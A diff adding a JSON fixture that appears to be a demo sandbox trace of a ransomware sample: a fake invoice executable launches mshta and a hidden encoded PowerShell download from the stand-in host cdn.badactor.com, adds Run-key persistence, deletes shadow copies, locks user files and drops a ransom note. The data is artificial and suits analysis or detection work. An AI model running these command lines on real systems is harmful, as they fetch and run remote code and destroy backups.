@@ -1,0 +1,244 @@
+{
+  "sample": {
+    "sample_id": "sample_ransomware_001",
+    "filename": "invoice_may_2026.exe",
+    "sha256": "37f5d29c18e7a2d4f0c6a9b7e1d2c3f4a1b2c3d4e5f67890123456789abcdef0",
+    "sandbox_source": "demo",
+    "platform": "Windows 10 x64",
+    "first_seen": "2026-05-07T10:15:00Z"
+  },
+  "events": [
+    {
+      "timestamp": 0.10,
+      "event_type": "process",
+      "action": "spawned_process",
+      "actor": {"pid": "4124", "name": "explorer.exe", "path": "C:\\Windows\\explorer.exe"},
+      "target": {
+        "pid": "5000",
+        "name": "invoice_may_2026.exe",
+        "path": "C:\\Users\\Student\\Downloads\\invoice_may_2026.exe",
+        "command_line": "\"C:\\Users\\Student\\Downloads\\invoice_may_2026.exe\""
+      }
+    },
+    {
+      "timestamp": 0.55,
+      "event_type": "process",
+      "action": "spawned_process",
+      "actor": {"pid": "5000", "name": "invoice_may_2026.exe", "path": "C:\\Users\\Student\\Downloads\\invoice_may_2026.exe"},
+      "target": {
+        "pid": "4128",
+        "name": "mshta.exe",
+        "path": "C:\\Windows\\System32\\mshta.exe",
+        "command_line": "mshta.exe https://cdn.badactor.com/x.hta"
+      }
+    },
+    {
+      "timestamp": 1.10,
+      "event_type": "process",
+      "action": "spawned_process",
+      "actor": {"pid": "4128", "name": "mshta.exe", "path": "C:\\Windows\\System32\\mshta.exe"},
+      "target": {
+        "pid": "4896",
+        "name": "powershell.exe",
+        "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+      }
+    },
+    {
+      "timestamp": 1.12,
+      "event_type": "api",
+      "action": "called",
+      "actor": {"pid": "4128", "name": "mshta.exe"},
+      "target": {"api": "CreateProcessW", "module": "kernel32.dll", "result": "SUCCESS"}
+    },
+    {
+      "timestamp": 1.40,
+      "event_type": "network",
+      "action": "dns_resolved",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {"domain": "cdn.badactor.com", "remote_ip": "193.233.7.23", "protocol": "DNS"}
+    },
+    {
+      "timestamp": 1.55,
+      "event_type": "network",
+      "action": "connect",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {"remote_ip": "193.233.7.23", "remote_port": 443, "domain": "cdn.badactor.com", "protocol": "HTTPS"}
+    },
+    {
+      "timestamp": 1.80,
+      "event_type": "network",
+      "action": "http_request",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {
+        "url": "https://cdn.badactor.com/payload.ps1",
+        "remote_ip": "193.233.7.23",
+        "remote_port": 443,
+        "domain": "cdn.badactor.com",
+        "protocol": "HTTPS"
+      }
+    },
+    {
+      "timestamp": 2.05,
+      "event_type": "file",
+      "action": "wrote_file",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {
+        "file_path": "C:\\Users\\Public\\payload.ps1",
+        "sha256": "9f3a4e1b2c0d5e8f6a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f7081234ab"
+      }
+    },
+    {
+      "timestamp": 2.20,
+      "event_type": "api",
+      "action": "called",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {"api": "VirtualAllocEx", "module": "kernel32.dll", "result": "SUCCESS"}
+    },
+    {
+      "timestamp": 2.25,
+      "event_type": "api",
+      "action": "called",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {"api": "WriteProcessMemory", "module": "kernel32.dll", "result": "SUCCESS"}
+    },
+    {
+      "timestamp": 2.30,
+      "event_type": "file",
+      "action": "wrote_file",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {
+        "file_path": "C:\\Users\\Public\\evil.dll",
+        "sha256": "11223344556677889900aabbccddeeff112233445566778899aabbccddeeff00"
+      }
+    },
+    {
+      "timestamp": 2.40,
+      "event_type": "module",
+      "action": "loaded_module",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {"path": "C:\\Users\\Public\\evil.dll", "name": "evil.dll"}
+    },
+    {
+      "timestamp": 2.50,
+      "event_type": "yara",
+      "action": "matched",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {"rule": "Suspicious_PowerShell_Downloader", "severity": "high"}
+    },
+    {
+      "timestamp": 2.70,
+      "event_type": "process",
+      "action": "spawned_process",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {
+        "pid": "5300",
+        "name": "reg.exe",
+        "path": "C:\\Windows\\System32\\reg.exe",
+        "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"C:\\Users\\Public\\payload.ps1\""
+      }
+    },
+    {
+      "timestamp": 2.85,
+      "event_type": "registry",
+      "action": "set_value",
+      "actor": {"pid": "5300", "name": "reg.exe"},
+      "target": {
+        "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "value_name": "Updater",
+        "value_data": "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\payload.ps1"
+      }
+    },
+    {
+      "timestamp": 3.10,
+      "event_type": "process",
+      "action": "spawned_process",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {
+        "pid": "5368",
+        "name": "vssadmin.exe",
+        "path": "C:\\Windows\\System32\\vssadmin.exe",
+        "command_line": "vssadmin.exe delete shadows /all /quiet"
+      }
+    },
+    {
+      "timestamp": 3.20,
+      "event_type": "api",
+      "action": "called",
+      "actor": {"pid": "5368", "name": "vssadmin.exe"},
+      "target": {"api": "CreateProcessW", "module": "kernel32.dll", "result": "SUCCESS"}
+    },
+    {
+      "timestamp": 3.50,
+      "event_type": "file",
+      "action": "modified_file",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {"file_path": "C:\\Users\\Student\\Documents\\report.docx.locked"}
+    },
+    {
+      "timestamp": 3.55,
+      "event_type": "file",
+      "action": "modified_file",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {"file_path": "C:\\Users\\Student\\Documents\\thesis.pdf.locked"}
+    },
+    {
+      "timestamp": 3.60,
+      "event_type": "file",
+      "action": "modified_file",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {"file_path": "C:\\Users\\Student\\Pictures\\family.jpg.locked"}
+    },
+    {
+      "timestamp": 3.65,
+      "event_type": "file",
+      "action": "modified_file",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {"file_path": "C:\\Users\\Student\\Pictures\\vacation.png.locked"}
+    },
+    {
+      "timestamp": 3.70,
+      "event_type": "file",
+      "action": "modified_file",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {"file_path": "C:\\Users\\Student\\Music\\song.mp3.locked"}
+    },
+    {
+      "timestamp": 4.00,
+      "event_type": "file",
+      "action": "wrote_file",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {
+        "file_path": "C:\\Users\\Student\\Desktop\\READ_ME_TO_RESTORE_FILES.txt",
+        "sha256": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
+      }
+    },
+    {
+      "timestamp": 4.20,
+      "event_type": "yara",
+      "action": "matched",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {"rule": "Generic_Ransom_Note", "severity": "high"}
+    },
+    {
+      "timestamp": 4.50,
+      "event_type": "network",
+      "action": "http_request",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {
+        "url": "https://cdn.badactor.com/check?id=DESKTOP-7K3L9QZ",
+        "remote_ip": "193.233.7.23",
+        "remote_port": 443,
+        "domain": "cdn.badactor.com",
+        "protocol": "HTTPS"
+      }
+    },
+    {
+      "timestamp": 4.80,
+      "event_type": "memory",
+      "action": "region_observed",
+      "actor": {"pid": "4896", "name": "powershell.exe"},
+      "target": {"path": "0x7ff8c1a00000", "name": "rwx_region_512KB"}
+    }
+  ]
+}
